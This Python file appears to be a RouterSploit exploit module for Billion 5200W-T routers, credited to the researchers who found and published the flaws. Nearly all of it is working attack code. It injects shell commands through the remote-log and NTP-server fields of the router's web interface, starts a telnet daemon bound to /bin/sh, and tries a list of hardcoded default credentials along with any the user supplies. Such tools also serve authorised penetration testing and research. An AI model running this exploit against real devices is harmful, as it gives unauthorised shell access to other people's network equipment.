from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
from routersploit.core.telnet.telnet_client import TelnetClient


class Exploit(HTTPClient, TelnetClient):
    __info__ = {
        "name": "Billion 5200W-T RCE",
        "description": "Module exploits Remote Command Execution vulnerability in Billion 5200W-T devices. "
                       "If the target is vulnerable it allows to execute commands on operating system level.",
        "authors": (
            "Pedro Ribeiro <pedrib[at]gmail.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://seclists.org/fulldisclosure/2017/Jan/40",
            "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt",
            "https://blogs.securiteam.com/index.php/archives/2910",
        ),
        "devices": (
            "Billion 5200W-T",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    telnet_port = OptPort(9999, "Telnet port used for exploitation")

    username = OptString("admin", "Default username to log in")
    password = OptString("password", "Default password to log in")

    def __init__(self):
        # hardcoded credentials
        self.creds = [
            ("admin", "password"),
            ("true", "true"),
            ("user3", "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678"),
        ]

    def run(self):
        cmd = "utelnetd -l /bin/sh -p {} -d".format(self.telnet_port)

        if self.execute1(cmd) or self.execute2(cmd):
            print_status("Trying to connect to the telnet server...")

            telnet_client = self.telnet_create(port=self.telnet_port)
            if telnet_client.connect():
                telnet_client.interactive()
                telnet_client.close()
            else:
                print_error("Exploit failed - Telnet connection error: {}:{}".format(self.target, self.telnet_port))
        else:
            print_error("Exploit failed")

    def execute1(self, cmd):
        print_status("Trying to exploit first command injection vulnerability...")
        payload = "1.1.1.1;{};#".format(cmd)

        data = {
            "RemotelogEnable": "1",
            "syslogServerAddr": payload,
            "serverPort": "514"
        }

        response = self.http_request(
            method="POST",
            path="/cgi-bin/adv_remotelog.asp",
            data=data,
        )

        if response is not None and response.status_code != 404:
            return True

        print_error("Exploitation failed for unauthenticated command injection")
        return False

    def execute2(self, cmd):
        print_status("Trying authenticated commad injection vulnerability...")

        # Iterate through hardcoded credentials and these provided by the user
        for creds in set(self.creds + [(self.username, self.password)]):
            print_status("Trying exploitation with creds: {}:{}".format(creds[0], creds[1]))
            # Fixate cookie
            cookies = {
                "SESSIONID": utils.random_text(8)
            }

            response = self.http_request(
                method="GET",
                path="/",
                cookies=cookies,
                auth=(creds[0], creds[1]),
            )

            if response is None:
                return False

            payload = "\"%3b{}%26%23".format(cmd)

            data = {
                "SaveTime": "1",
                "uiCurrentTime2": "",
                "uiCurrentTime1": "",
                "ToolsTimeSetFlag": "0",
                "uiRadioValue": "0",
                "uiClearPCSyncFlag": "0",
                "uiwPCdateMonth": "0",
                "uiwPCdateDay": "",
                "&uiwPCdateYear": "",
                "uiwPCdateHour": "",
                "uiwPCdateMinute": "",
                "uiwPCdateSec": "",
                "uiCurTime": "N/A+(NTP+server+is+connecting)",
                "uiTimezoneType": "0",
                "uiViewSyncWith": "0",
                "uiPCdateMonth": "1",
                "uiPCdateDay": "",
                "uiPCdateYear": "",
                "uiPCdateHour": "",
                "uiPCdateMinute": "",
                "uiPCdateSec": "",
                "uiViewdateToolsTZ": "GMT+07:00",
                "uiViewdateDS": "Disable",
                "uiViewSNTPServer": payload,
                "ntp2ServerFlag": "N/A",
                "ntp3ServerFlag": "N/A",
            }

            response = self.http_request(
                method="POST",
                path="/cgi-bin/tools_time.asp",
                cookies=cookies,
                data=data,
                auth=(creds[0], creds[1]),
            )
            if response is None:
                return False

        return True

    @mute
    def check(self):
        # it is not possible to check if the target is vulnerable without exploiting device
        return None
